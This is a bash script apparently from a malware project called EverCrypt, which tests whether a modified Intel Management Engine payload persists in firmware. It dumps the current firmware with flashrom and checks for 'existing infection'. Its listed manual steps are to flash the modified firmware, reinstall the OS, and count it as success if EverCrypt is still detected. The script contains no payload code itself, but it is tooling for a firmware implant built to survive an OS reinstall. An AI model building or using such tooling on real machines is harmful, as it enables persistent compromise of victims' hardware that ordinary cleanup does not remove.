#!/bin/bash
set -e

echo "╔═══════════════════════════════════════════════╗"
echo "║   EverCrypt Hardware Persistence Test         ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""
echo "⚠️  WARNING: Only run on TEST hardware!"
echo ""

if [ "$EUID" -ne 0 ]; then
    echo "[!] Must run as root"
    exit 1
fi

# Check for ME payload
ME_BIN="../../me_payload/build/evercrypt_me_padded.bin"
if [ ! -f "$ME_BIN" ]; then
    echo "[!] ME payload not found"
    exit 1
fi

echo "[✓] ME payload: $(stat -c%s $ME_BIN) bytes"

# Dump current firmware
echo "[*] Step 1: Backup current firmware"
if command -v flashrom &> /dev/null; then
    flashrom -p internal -r firmware_backup.bin 2>/dev/null || \
    echo "[!] flashrom failed - need hardware programmer"
else
    echo "[!] flashrom not found"
    echo "Install: sudo pacman -S flashrom"
    exit 1
fi

# Verify EverCrypt presence
echo "[*] Step 2: Check for existing infection"
python3 ../../tools/me_analyzer/verify_integrity.py firmware_backup.bin

echo ""
echo "[✓] Persistence test framework ready"
echo ""
echo "Manual steps required:"
echo "  1. Flash modified firmware"
echo "  2. Boot normally - verify EverCrypt loads"
echo "  3. Reinstall OS from USB"
echo "  4. Run this script again"
echo "  5. If EverCrypt still detected = SUCCESS"
